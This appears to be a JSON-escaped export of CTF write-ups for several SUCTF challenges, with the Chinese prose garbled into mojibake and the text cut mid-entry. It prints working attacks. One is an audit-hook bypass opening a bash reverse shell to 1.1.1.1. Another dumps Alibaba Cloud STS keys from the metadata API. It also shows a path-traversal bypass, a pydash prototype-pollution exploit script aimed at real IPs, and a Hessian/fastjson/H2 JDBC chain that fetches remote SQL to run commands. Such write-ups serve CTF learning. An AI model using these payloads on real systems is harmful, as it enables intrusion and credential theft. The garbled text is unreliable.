{\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, 